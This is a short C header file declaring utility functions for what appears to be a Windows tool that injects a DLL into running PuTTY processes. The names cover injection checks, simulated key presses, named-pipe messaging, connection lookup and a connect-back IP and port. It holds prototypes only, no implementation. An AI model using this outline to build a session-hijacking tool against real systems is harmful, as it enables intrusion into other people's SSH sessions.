#ifndef __UTILS_H__
#define __UTILS_H__

#define WIN32_LEAN_AND_MEAN
#include <windows.h>
#include <stdio.h>
#include <iphlpapi.h>

#define BUFSIZE     512

DWORD   GetModuleBaseAddress();
BOOL    GetTextSection(CHAR* modulePath, PDWORD startAddr, PDWORD length);
BOOL    HexStringToBytes(CHAR* pHexStr, UCHAR* pByteArray);
DWORD   GetPidFromProcname(CHAR* procName);
BOOL    ReadPipeMessage(HANDLE hPipe, CHAR* buffer);
BOOL    WritePipeMessage(HANDLE hPipe, CHAR* buffer);
BOOL    GetEstablishedConnOfPid(DWORD pid, MIB_TCPROW_OWNER_PID* pConnInfo);
BOOL    IPv4ToString(DWORD ip, CHAR* dst, INT dstSize);
VOID    PrintLastError();
VOID    ListPuttyProcesses(UCHAR* procName, UCHAR* dllName);
BOOL    PressPuttyKey(UINT keyCode);
DWORD   GetPidNotInjected(CHAR* procName, UCHAR* dllName);
VOID    ConvertToChar(WCHAR *wbuf, CHAR *buf);
BOOL    ParseIPPort(CHAR* connectBackInfo, CHAR* connectBackIP, DWORD* connectBackPort);

const unsigned char* memmem(const unsigned char* haystack, size_t hlen,
                           const unsigned char* needle,   size_t nlen);
                           
#endif